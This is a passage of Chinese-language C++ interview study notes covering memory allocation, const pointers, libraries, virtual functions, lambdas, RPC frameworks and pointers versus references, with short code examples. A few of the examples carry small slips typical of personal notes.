<p>A* a&#x3D;new A();</p>
<p>A* aa&#x3D;(A*)malloc (sizeof(A));</p>
</blockquote>
</li>
<li><p>对数组的处理；</p>
<blockquote>
<p>new的话，有new []，delete []</p>
<p>A * ptr &#x3D; new A[10];&#x2F;&#x2F;分配10个A对象</p>
<p>delete [] ptr;</p>
<p>——————————</p>
<p>int * ptr &#x3D; (int *) malloc( sizeof(int) );&#x2F;&#x2F;分配一个10个int元素的数组</p>
</blockquote>
</li>
<li><p>是否可以被重载；</p>
<blockquote>
<p>new 是操作符(需要编译器支持)，可以被重载，malloc&#x2F;free是库函数（头文件支持），不能被重载</p>
</blockquote>
</li>
<li><p>能够直观的重新分配内存；</p>
<blockquote>
<p>malloc内存不够，可以用realloc扩张内存大小</p>
<p>new没有</p>
</blockquote>
</li>
<li><p>客户处理内存分配不足；</p>
</li>
</ol>
<p>总结：</p>
<p>malloc给你的就好像一块原始的土地，你要种什么需要自己在土地上来播种</p>
<p>而new帮你划好了田地的分块（数组），帮你播了种（构造函数），还提供其他的设施给你使用</p>
<p><strong>来源：CSDN</strong> <a href="http://t.csdn.cn/nQer6">AI浩</a></p>
<h2 id="有了malloc-x2F-free-为什么还要有new-x2F-delete"><a href="#有了malloc-x2F-free-为什么还要有new-x2F-delete" class="headerlink" title="有了malloc&#x2F;free 为什么还要有new&#x2F;delete"></a>有了malloc&#x2F;free 为什么还要有new&#x2F;delete</h2><p>new 在对象创建的时候执行构造函数&#x2F; delete 销毁的时候执行析构函数</p>
<h3 id="new的工作原理："><a href="#new的工作原理：" class="headerlink" title="new的工作原理："></a>new的工作原理：</h3><p>先调用operator new函数，申请足够内存(底层用malloc)</p>
<p>调用类型的构造函数，初始化成员变量</p>
<p>返回自定义类型指针</p>
<p>new[] 返回的是元素类型的指针</p>
<p>new的机制是将内存分配和对象构造组合一起</p>
<h3 id="delete工作原理"><a href="#delete工作原理" class="headerlink" title="delete工作原理"></a>delete工作原理</h3><p>调用operator delete释放内存(底层用free)</p>
<p>delete[] 将元素逆序销毁</p>
<p>delete也是将对象析构和内存释放组合一起</p>
<p>而allocator将这两部分分开，申请一部分内存，不初始化对象，只有当需要的时候才初始化操作</p>
<h2 id="被free回收的内存是立即返回操作系统吗"><a href="#被free回收的内存是立即返回操作系统吗" class="headerlink" title="被free回收的内存是立即返回操作系统吗"></a>被free回收的内存是立即返回操作系统吗</h2><p>否，会首先被ptmalloc使用双链表保存起来，并尝试对小块内存合并，当用户下一次申请内存的时候，会尝试从这些内存中寻找合适的返回，就避免了频繁的系统调用，占用过多的系统资源。</p>
<h1 id="10-常量指针和指针常量有什么区别？"><a href="#10-常量指针和指针常量有什么区别？" class="headerlink" title="10.常量指针和指针常量有什么区别？"></a>10.常量指针和指针常量有什么区别？</h1><p>指向const的指针，指向一个常量项目。<strong>指针指向的数据不能改变，但指针本身可以改变</strong></p>
<p>对于const指针，指针本身就是常量。<strong>一旦指针使用了某个地址进行初始化，那么它就不能指向除此地址之外的任何其他东西</strong></p>
<p>来自 精通c++(第9版)</p>
<h2 id="指针常量"><a href="#指针常量" class="headerlink" title="指针常量"></a>指针常量</h2><p><code>指针常量</code>是一个指针，（即指向常量的指针）指向一个只读常量，这个值因为是常量，所以不能被修改，const在*之前</p>
<p><code>const int* p //const int是p指向的内容,*表示p是一个指针</code></p>
<p>注意的是：const适用于p指向的东西；而不是p本身</p>
<p>虽然常量的地址只能传递给指向const的指针，但是，指向const的指针是可以接收非常量的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void display(const int *nums,int size)</span><br><span class="line">&#123;</span><br><span class="line">	for(int i=0;i&lt;sizel;i++)</span><br><span class="line">	cout&lt;&lt;*(nums+i)&lt;&lt;&quot; &quot;;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">int size=6;</span><br><span class="line">const int arr1[size]=&#123;1,2,3,4,5,6&#125;;</span><br><span class="line">display(arr1,size);// 1 2 3 4 5 6</span><br><span class="line"></span><br><span class="line">int arr2[size]=&#123;2,4,6,8,10,12&#125;;</span><br><span class="line">display(arr2,size);//2 4 6 8 10 12</span><br></pre></td></tr></table></figure>

<p>应用场景：当编写一个使用指针形参的函数，并且该函数不打算改变形参指向的数据时，将形参设置为一个指向const的指针。</p>
<p>补充：</p>
<p>数组名称是指针常量(Pointer Conster)，不能让它们指向除了它们所代表的数组之外的任何东西</p>
<blockquote>
<p>int a[20],b[20];</p>
<p>int *p;</p>
<p>p&#x3D;a;&#x2F;&#x2F;正确</p>
<p>a&#x3D;b;&#x2F;&#x2F;错误</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int x = 10; </span><br><span class="line">int y = 20;</span><br><span class="line">const int* ptr = &amp;x;</span><br><span class="line">ptr = &amp;y;</span><br><span class="line">//*x=30 //Error</span><br><span class="line">它可以指向不同的常量，但数据不能改</span><br></pre></td></tr></table></figure>

<h2 id="常量指针"><a href="#常量指针" class="headerlink" title="常量指针"></a>常量指针</h2><p><code>常量指针</code>是一个不能给改变指向的指针。指针是一个常量必须初始化，一旦初始化完成，它的值，即这个地址就不能改变，<strong>不能中途改变指向</strong> ，const在*之后，如</p>
<p><code>int *const p; //*const 表示p是一个常量指针，int是p指向的内容</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int x = 10;</span><br><span class="line">int y = 20;</span><br><span class="line"></span><br><span class="line">int* const ptr = &amp;x; // ptr is a pointer constant to an integer, pointing to x</span><br><span class="line">//ptr = &amp;y; // Error</span><br><span class="line">*x = 30; // Valid</span><br><span class="line">它可以修改数据，但不能修改指向</span><br></pre></td></tr></table></figure>

<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>还有一个指向常量的常量指针，<code>const int *const ptr;//const int是ptr指向的内容，*const表示ptr是一个常量指针</code> <strong>既不可以改变指针指向的内容,也不能再去修改指针指向的地址</strong></p>
<h1 id="11-map-和-unordered-map-的区别以及适用场景？"><a href="#11-map-和-unordered-map-的区别以及适用场景？" class="headerlink" title="11. map 和 unordered_map 的区别以及适用场景？"></a>11. map 和 unordered_map 的区别以及适用场景？</h1><p>map会自动按键的字典序排序</p>
<p>unordered_map随机排序，用于查找</p>
<h1 id="12-静态链接库和动态链接库各自的优缺点分别是什么？"><a href="#12-静态链接库和动态链接库各自的优缺点分别是什么？" class="headerlink" title="12. 静态链接库和动态链接库各自的优缺点分别是什么？"></a>12. 静态链接库和动态链接库各自的优缺点分别是什么？</h1><p>静态链接库的优点：</p>
<blockquote>
<p>代码装载速度快，执行速度略比动态链接库快； </p>
<p>只需保证在开发者的计算机中有正确的.LIB 文件，在以二进制形式发布程序时不需考虑在用户的计算机<br>上 .LIB 文件是否存在及版本问题，可避免 DLL 地狱等问题。</p>
</blockquote>
<p>​		缺点：</p>
<blockquote>
<p>使用静链接生成的可执行文件体积较大，包含相同的公共代码，造成浪费</p>
<p>全量更新</p>
</blockquote>
<p>动态链接库优点：</p>
<blockquote>
<p>更加节省内存并减少页面交换；</p>
<p>DLL 文件与 EXE 文件独立，只要输出接口不变（即名称、参数、返回值类型和调用约定不变），更换 DLL 文件不会对 EXE 文件造成任何影响，因而极大地提高了可维护性和可扩展性；</p>
<p>不同编程语言编写的程序只要按照函数调用约定就可以调用同一个 DLL 函数；</p>
</blockquote>
<p>缺点：</p>
<blockquote>
<p>使用动态链接库的应用程序不是自完备的，它依赖的 DLL 模块也要存在，如果使用载入时动态链接， 程序启动时发现 DLL 不存在，系统将终止程序并给出错误信息。</p>
<p>而使用运行时动态链接，系统不会终止，但由于 DLL 中的导出函数不可用，程序会加载失败；</p>
<p>速度比静态链接慢</p>
<p>当某个模块更新后，如果新模块与旧的模块不兼容，那么那些需要该模块才能运行的软件，统统撕掉。</p>
</blockquote>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>库是写好的现有的，成熟的，可以复用的代码。</p>
<p>静态和动态指<strong>链接</strong></p>
<p>将一个程序编译成可执行程序的步骤：将源文件(.h,.cpp)预编译-&gt;编译-&gt;汇编-&gt;<strong>链接</strong></p>
<p><code>静态库是.lib</code></p>
<p>其特点：</p>
<blockquote>
<ol>
<li>静态库对函数库的链接是放在编译时期完成的</li>
<li>程序在运行时与函数库再无瓜葛，移植方便</li>
<li>浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件</li>
</ol>
</blockquote>
<p><code>动态库是.dll</code></p>
<p>由于静态库的空间浪费和全量更新(如果静态库liba.lib更新了，所以使用它的应用程序都需要重新编译、发布给用户)</p>
<p>其特点：</p>
<blockquote>
<ol>
<li>动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。</li>
<li><strong>不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例</strong>，规避了空间浪费问题</li>
<li>解决了静态库对程序的更新、部署和发布页会带来麻烦</li>
</ol>
</blockquote>
<p>来源CSDN <a href="http://t.csdn.cn/99Ige">hllyzms</a></p>
<h1 id="13-C-虚函数、纯虚函数的区别和适用场景？"><a href="#13-C-虚函数、纯虚函数的区别和适用场景？" class="headerlink" title="13. C++虚函数、纯虚函数的区别和适用场景？"></a>13. C++虚函数、纯虚函数的区别和适用场景？</h1><p>虚函数:</p>
<p>在类成员方法的声明语句前加 “virtual”, 如 virtual void func() ；</p>
<p>对于虚函数,子类可以(也可以不)重新定义基类的虚函数，该行为称之为复写 Override 。 </p>
<p>纯虚函数:</p>
<p>在虚函数后加“&#x3D;0” ,如 virtual void func()&#x3D;0 ;</p>
<p>对于纯虚函数，<strong>子类必须</strong>提供纯函数的个性化实现</p>
<p>使用场景：当子类<strong>必须</strong>要实现个性化的时候，用纯虚函数</p>
<h1 id="14-是否遇到过-C-变量冲突的情况？如何解决？"><a href="#14-是否遇到过-C-变量冲突的情况？如何解决？" class="headerlink" title="14. 是否遇到过 C++变量冲突的情况？如何解决？"></a>14. 是否遇到过 C++变量冲突的情况？如何解决？</h1><p>换变量名；</p>
<p>应用命名空间；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//来自chatgpt</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">// First namespace named &#x27;A&#x27;</span><br><span class="line">namespace A &#123;</span><br><span class="line">    int num = 5; // Variable &#x27;num&#x27; in namespace &#x27;A&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Second namespace named &#x27;B&#x27;</span><br><span class="line">namespace B &#123;</span><br><span class="line">    int num = 10; // Variable &#x27;num&#x27; in namespace &#x27;B&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // Accessing variables from namespaces</span><br><span class="line">    std::cout &lt;&lt; &quot;Value from namespace A: &quot; &lt;&lt; A::num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; &quot;Value from namespace B: &quot; &lt;&lt; B::num &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>命名空间嵌套；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namespace Outer &#123;</span><br><span class="line">    int num = 5; // Variable &#x27;num&#x27; in outer namespace &#x27;Outer&#x27;</span><br><span class="line"></span><br><span class="line">    // Inner namespace named &#x27;Inner&#x27; within &#x27;Outer&#x27;</span><br><span class="line">    namespace Inner &#123;</span><br><span class="line">        int num = 10; // Variable &#x27;num&#x27; in inner namespace &#x27;Inner&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">std::cout &lt;&lt; &quot;Value from outer namespace: &quot; &lt;&lt; Outer::num &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &quot;Value from inner namespace: &quot; &lt;&lt; Outer::Inner::num &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure>

<p>加入类前缀 作为成员变量</p>
<h2 id="15-聊聊-C-的内存碎片？"><a href="#15-聊聊-C-的内存碎片？" class="headerlink" title="15 .聊聊 C++的内存碎片？"></a>15 .聊聊 C++的内存碎片？</h2><p>即碎片的内存，分为外碎片和内碎片</p>
<p>内存碎片指的是系统中不可用的空闲内存</p>
<p>由于空闲内存小，且以不连续方式出现在不同位置。</p>
<p>该问题解决取决于内存管理算法</p>
<h1 id="16-C-中-lambda-表达式的捕捉变量的方式有哪几种？"><a href="#16-C-中-lambda-表达式的捕捉变量的方式有哪几种？" class="headerlink" title="16. C++中 lambda 表达式的捕捉变量的方式有哪几种？"></a>16. C++中 lambda 表达式的捕捉变量的方式有哪几种？</h1><h2 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h2><p>lambda本质上是一个<strong>匿名函数</strong>。 用这种方式创建函数不需要实际创建一个函数 ，它就像一个<strong>快速的一次性函数</strong> 。 lambda更像是一种变量，在实际编译的代码中作为一个符号存在，而不是像正式的函数那样。</p>
<p>使用格式：<code>[]( &#123;参数表&#125; )&#123; 函数体 &#125;</code></p>
<blockquote>
<p>中括号<strong>表示的是</strong>捕获，作用是<strong>如何传递变量</strong> lambda使用<strong>外部（相对）</strong>的变量时，就要<strong>使用捕获</strong>。</p>
</blockquote>
<p>如果使用捕获,则：</p>
<ul>
<li>添加头文件： <code>#include &lt;functional&gt;</code></li>
<li>修改相应的函数签名 <code>std::function &lt;void(int)&gt; func</code>替代 <code>void(*func)(int)</code></li>
<li>捕获[]使用方式：</li>
</ul>
<blockquote>
<p><code>[=]</code>，则是将所有变量<strong>值传递</strong>到lambda中<br><code>[&amp;]</code>，则是将所有变量<strong>引用传递</strong>到lambda中<br><code>[a]</code>是将变量a通过值传递，如果是<code>[&amp;a]</code>就是将变量a引用传递<br>它可以有0个或者多个捕获</p>
</blockquote>
<p>基础使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line"></span><br><span class="line">void foreach(const std::vector&lt;int&gt; &amp;values,void(*func)(int))</span><br><span class="line">&#123;</span><br><span class="line">    for(int value:values)</span><br><span class="line">        func(value);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    std::vector&lt;int&gt; values=&#123;6,1,7,0,9&#125;;</span><br><span class="line">    foreach(values,[](int value)&#123;std::cout&lt;&lt;&quot;Value: &quot;&lt;&lt;value&lt;&lt;std::endl;&#125;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Value: 6<br>Value: 1<br>Value: 7<br>Value: 0<br>Value: 9</p>
</blockquote>
<p>这里对捕获解释一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">std::vector&lt;int&gt; values=&#123;6,1,7,0,9&#125;;</span><br><span class="line"> int a=5;</span><br><span class="line"> auto lambda=[](int value)&#123;std::cout&lt;&lt;&quot;Value: &quot;&lt;&lt;a&lt;&lt;std::endl;&#125;;</span><br><span class="line"> foreach(values,lambda);</span><br></pre></td></tr></table></figure>

<p>看，我们尝试让lambda函数输出a</p>
<blockquote>
<p> error: ‘a’ is not captured<br>     auto lambda&#x3D;[](int value){std::cout&lt;&lt;”Value: “&lt;&lt;a&lt;&lt;std::endl;};<br>                                                     ^<br>lambda.cpp:13:18: note: the lambda has no capture-default<br>     auto lambda&#x3D;[](int value){std::cout&lt;&lt;”Value: “&lt;&lt;a&lt;&lt;std::endl;};<br>                  ^<br>lambda.cpp:12:9: note: ‘int a’ declared here<br>     int a&#x3D;5;</p>
</blockquote>
<p>报错说，a没有<code>捕获</code></p>
<p>在中括号补充一个<code>=</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto lambda=[=](int value)&#123;std::cout&lt;&lt;&quot;Value: &quot;&lt;&lt;a&lt;&lt;std::endl;&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>error: cannot convert ‘main()::&lt;lambda(int)&gt;’ to ‘void (<em>)(int)’ for argument ‘2’ to ‘void foreach(const std::vector&lt;int&gt;&amp;, void (</em>)(int))’<br>     foreach(values,lambda);</p>
</blockquote>
<p>因为使用了<code>捕获</code></p>
<p>所以要添加头文件，然后更改下新的函数指针的签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..</span><br><span class="line">#include&lt;functional&gt;</span><br><span class="line">void foreach(const std::vector&lt;int&gt; &amp;values,const std::function&lt;void(int)&gt;&amp; func)</span><br><span class="line">&#123;</span><br><span class="line">    for(int value:values)</span><br><span class="line">        func(value);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">auto lambda=[=](int value)&#123;std::cout&lt;&lt;&quot;Value: &quot;&lt;&lt;a&lt;&lt;std::endl;&#125;;</span><br><span class="line">//这里[&amp;] [a] [&amp;a]都可</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Value: 5…</p>
</blockquote>
<p>万一我们想对捕获的变量修改值怎么办呢？</p>
<p>需要用到mutable</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">auto lambda=[=](int value) mutable &#123;a=6,std::cout&lt;&lt;&quot;Value: &quot;&lt;&lt;a&lt;&lt;std::endl;&#125;;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Value: 6…</p>
</blockquote>
<p>还可以写一个lambda去接受vector元素，遍历该vector找到大于6的数，并返回它的迭代器</p>
<p>find_if是搜索类函数，<code>需要头文件algorithm</code></p>
<p>它与find不同，find_if是<strong>可以接受一个函数指针来定义搜索的规则，返回满足这个规则的第一个元素的迭代器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    std::vector&lt;int&gt; values=&#123;6,1,7,0,9&#125;;</span><br><span class="line">    auto it=find_if(values.begin(),values.end(),[](int value)&#123;return value&gt;6;&#125;);</span><br><span class="line">   std::cout&lt;&lt;*it;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>7</p>
</blockquote>
<h1 id="17-C-中-final-关键字是做什么的？能否想到更多作用？"><a href="#17-C-中-final-关键字是做什么的？能否想到更多作用？" class="headerlink" title="17.C++中 final 关键字是做什么的？能否想到更多作用？"></a>17.C++中 final 关键字是做什么的？能否想到更多作用？</h1><p>C++11 引入了关键字 final ，按官方的标准是该关键字是用来标识虚函数不能在子类中被覆盖(override) ，或一个类不能被继承。</p>
<h1 id="18-对-RPC-框架有什么了解？原理？"><a href="#18-对-RPC-框架有什么了解？原理？" class="headerlink" title="18.对 RPC 框架有什么了解？原理？"></a>18.对 RPC 框架有什么了解？原理？</h1><p>远程过程调用（Remote Procedure Call ，缩写为RPC）是一个计算机通讯协议</p>
<p>允许运行于一台计算机的程序调用另一台计算机的子程序，就像调用本地程序一样，无需额外的为这个交互作用编程（无需关注细节）</p>
<p>RPC用户调用接口 + 具体网络协议。 前者为开发者需要关心的，后者由框架来实现。</p>
<p>RPC是一种服务器-客户端模式，经典实现是一个通过 发送请求-接收响应 进行信息交互的系统</p>
<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>如果有一个数独求解服务器，包含了登陆服务模块、计算求解模块、后台管理模块，开始时服务器可以部署在单机，但是如果用户增多、请求计算量增多，那么就需要<strong>集群</strong>和<strong>分布式</strong>部署架构达到高并发要求</p>
<h2 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h2><p>将服务器部署到了多台机器上，每一台机器上都是独立的服务器。</p>
<p>再通过负载均衡服务器进行管理，供用户使用，由此大大增加了服务器的并发负载量。</p>
<p>这种部署方式比较简单，并且切实的提高了服务器的并发量。</p>
<p>缺点：</p>
<p>1.服务器的一个模块修改，所有服务器都要重新编译、部署，所以是<strong>维护麻烦</strong></p>
<p>2.服务器有些模块是CPU密集型，需要CPU性能强的机器，有些I&#x2F;O密集型，需要内存更大点的机器，所以<strong>是各模块对硬件资源要求不同</strong></p>
<p>因此，引入分布式架构</p>
<h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><p><strong>支持分模块部署服务器</strong>，例如将数独服务器的计算模块部署到一个CPU强的机器上（不一定是一个，可以单独对模块进行集群部署），将登录模块部署到内存大的机器上。</p>
<p>如此分模块运行在<strong>不同</strong>机器的docker<strong>虚拟化环境</strong>中，属于<strong>不同的进程</strong>，分布在不同机器的各个模块共同构成了高性能的服务器。由此，<code>集群的两个问题都可以得到解决</code>。</p>
<p><strong>但是</strong>嘞，有这样一种情况：有些模块的某段代码，其他模块也需要调用，这样的话，模块间是有<strong>大量重复代码</strong>的</p>
<p>为了让机器1上的模块调用机器2上模块的方法，必要要有一个通信协议，即<code>RPC通信框架</code></p>
<h3 id="RPC框架原理"><a href="#RPC框架原理" class="headerlink" title="RPC框架原理"></a>RPC框架原理</h3><p>分布式计算的 CS 模式，总是由 Client 向 Server 发出一个执行若干过程请求，Server 接受请求，使用客户端提供的参数，计算完成之后将结果返回给客户端。</p>
<p><strong>由于提供端与客户端分属于不同的进程乃至不同的机器，那么必定是需要通过网络进行通信，并且需要是可靠的网络。</strong></p>
<p>通信框架一般是这样：</p>
<p>user-&gt;序列化-&gt;通信-&gt;反序列化-&gt;server</p>
<p>其实现需解决三个部分：</p>
<p>1.<code>调用映射</code></p>
<blockquote>
<p>比如调用者要调用RPC的login方法，怎么保证它不会调用到register方法呢？</p>
<p>这就需要RPC框架建立一个映射表，</p>
<p>比如{server_name,severinfo}，serverinfo包含server对象</p>
<p>以及{method_name,methoddescriptor}</p>
<p>先解析server_name,得到要连接的server的ip和端口，再通过method_name找到要调用的函数</p>
</blockquote>
<p>2.<code>序列化与反序列化</code></p>
<blockquote>
<p>一般的参数调用，系统会将参数放进内存中，但是远程调用又是另一台机器，不能通过内存传递函数，需要RPC客户将参数序列化为字节流，传给RPC提供方，它进行反序列化，得到参数。</p>
<p>这个序列化反序列化方法之一是Protobuf，它的字节流是用二进制存储的</p>
<p>并且Protobuf提供了很完备的RPC服务接口，很方便通过.proto文件生成服务器与客户端需要的RPCService类与Stub类。</p>
</blockquote>
<p>3.<code>网络传输</code></p>
<blockquote>
<p>RPC既然是远程调用，离不开网络传输，可以使用muduo库</p>
<p>是一个linux多线程网络库，使用的是reactors in threads - one loop per thread模式，支持多线程，高并发。</p>
</blockquote>
<p>来源: CSDN <a href="http://t.csdn.cn/LCDLF">Jacky__Ren</a></p>
<p>使用最广泛的 Spring Cloud，基于 Spring Boot 特性整合了开源行业中优秀的组件，整体对外提供了一套在微服务架构中服务治理的解决方案。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230806221812465.png"></p>
<p>1.服务集成RPC后，Provider启动后会通过Register模块，把服务的唯一ID和IP地址，端口信息等注册到RPC框架注册中心</p>
<p>2.调用者(Consumer)想要调用服务的时候，通过Provider注册时的服务唯一ID去注册中心查找在线可供调用的服务，返回一个IP列表（notify部分）</p>
<p>3.Consumer根据一定策略，比如随机或轮询从Register返回的可用IP列表真正调用服务(invoke)</p>
<p>4.最后是统计功能，RPC框架提供监控功能，监控服务监控状态，控制服务线上扩展和上下线</p>
<h2 id="主流RPC"><a href="#主流RPC" class="headerlink" title="主流RPC"></a>主流RPC</h2><p>RMI(java自带的远程方法调用工具)</p>
<p>Hessian（基于HTTP的远程方法调用）</p>
<p>Dubbo（淘宝开源的基于TCP的RPC框架）</p>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>Provider：服务提供方，CS 模型中的 Server。<br>Consumer： 调用远程服务服务消费方，CS 模型中的 Client。<br>Registry：服务注册与发现的服务管理中心。<br>Monitor：统计服务的调用次数和调用时间的监控中心。<br>Container：服务运行容器，如 jetty。</p>
<h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p>服务容器负责启动，加载，运行服务提供者。<br>服务提供者在启动时，向注册中心注册自己提供的服务，暴露自己的 IP 和端口信息。<br>服务消费者在启动时，向注册中心订阅自己所需的服务。<br>注册中心返回服务提供者列表给消费者，如果有变更，注册中心将基于长连接推送给数据消费者。<br>服务消费者，从提供这地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另外一台服务调用。<br>服务消费者和提供者，在内存中累计调用次数和调用时间，定时发送一次统计数据到监控中心。</p>
<p>来源：CSDN <a href="http://t.csdn.cn/72BLc">Q.E.D.</a></p>
<h1 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h1><p>很多时候不会使用using namespace std;（会不容易分辨各类函数来源）</p>
<p>以vector为例，自己的库定义了一个vector，标准库又有一个，这时候引用using namespace std;</p>
<p>会出现分歧</p>
<p>大型程序往往会使用多个独立开发的库，这些库会定义大量的全局名字，如类、函数和模板等，不可避免会出现某些名字相互冲突的情况。命名空间<code>namespace</code>分割了全局命名空间，其中每个命名空间是一个作用域。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namespace foo &#123;</span><br><span class="line">    class Bar &#123; /*...*/ &#125;;</span><br><span class="line">&#125;  // 命名空间结束后无需分号</span><br></pre></td></tr></table></figure>

<h2 id="c-三大特性"><a href="#c-三大特性" class="headerlink" title="c++三大特性"></a>c++三大特性</h2><p>多态:主要指泛型编程运行时多态；在基类的函数加上virtual关键字，派生类重写该函数，运行时会根据对象的实际类型调用相应的函数。</p>
<p>多态性，允许将子类类型的指针复制给父类类型的指针</p>
<p><strong>重载实现编译时多态，虚函数实现运行时多态</strong></p>
<p>封装：封装隐藏了实现细节，使得代码模块化</p>
<p>继承:子类继承父类的数据和方法</p>
<p><strong>泛型编程:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">T max1(T a, T b)</span><br><span class="line">&#123;</span><br><span class="line">    return a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line">//#endif</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;max1(2,3)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;max1(3.1f,2.6f)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;max1(&#x27;a&#x27;,&#x27;b&#x27;)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;max1(&quot;abc&quot;,&quot;abb&quot;)&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>3<br>3.1<br>b<br>abc</p>
</blockquote>
<h2 id="重载与重写的区别"><a href="#重载与重写的区别" class="headerlink" title="重载与重写的区别"></a>重载与重写的区别</h2><p>重载：</p>
<p>是一个类中多态性的体现， 同一个类中<strong>不同函数</strong>使用相同<strong>函数名</strong>，但<strong>函数的参数个数</strong>和<strong>类型不同</strong>，有<strong>不同的返回类型</strong></p>
<p>重写：</p>
<p><strong>子类对父类函数的重新实现</strong>，<strong>函数名和参数与父类一样</strong>，子类与父类<strong>函数体内容不一样</strong>，子类返回类型必须与父类保持一致。</p>
<h2 id="指针和引用区别"><a href="#指针和引用区别" class="headerlink" title="指针和引用区别"></a>指针和引用区别</h2><p>&amp;叫做地址运算符，*是间接运算符</p>
<p>int* ptr;&#x2F;&#x2F;这样的书写方式说明ptr数据类型不是int，而是int指针</p>
<p>cout&lt;&lt;*ptr，这将解引用指针，实际上使用指针指向的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a=10;</span><br><span class="line">cout&lt;&lt;a&lt;&lt;&quot;,&quot;&lt;&lt;&amp;a&lt;&lt;&quot;,&quot;&lt;&lt;*&amp;a;// 10,0x72fe0c,10</span><br></pre></td></tr></table></figure>



<ul>
<li><p>指针是一个新的<code>变量</code>，存储的是地址，可通过访问这个地址来修改另一个变量；</p>
<p>引用属于<code>原变量的别名</code>，对引用的任何操作就是对变量本身操作</p>
</li>
<li><p>指针可以有多级，引用就一级</p>
</li>
<li><p>指针可以为空，引用定义时必须初始化</p>
</li>
<li><p>指针初始化后可以改变指向，但引用不可以</p>
</li>
<li><p>sizeof指针得到的是该指针的大小，sizeof引用是引用所指向变量的大小</p>
</li>
<li><p>指针作为参数传递时(将实参的一个拷贝传递给形参，两者指向的地址相同，但不是同一个变量)，在函数中改变这个变量的指向不影响实参，引用却可以</p>
<p>(即，指针传参还是值传递，指针本身的值不可改，除非解引用对指向的对象进行操作；</p>
<p>引用传参，传进来的就是变量本身，因此变量可以修改</p>
<p>)</p>
</li>
<li><p>引用本身不是一种数据类型，不占用存储单元；指针是具体的变量，占用存储空间</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void testPTR(int *p)</span><br><span class="line">&#123;</span><br><span class="line">	int a=12;</span><br><span class="line">	p=&amp;a;</span><br><span class="line">&#125;</span><br><span class="line">void testREFF(int &amp;p)</span><br><span class="line">&#123;</span><br><span class="line">	int a=12;</span><br><span class="line">	p=a;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a=10;</span><br><span class="line">	int* b=&amp;a;</span><br><span class="line">	testPTR(b);</span><br><span class="line">	cout&lt;&lt;a; //10</span><br><span class="line">	cout&lt;&lt;*b;//10</span><br><span class="line">	——————————————</span><br><span class="line">	a=10;</span><br><span class="line">	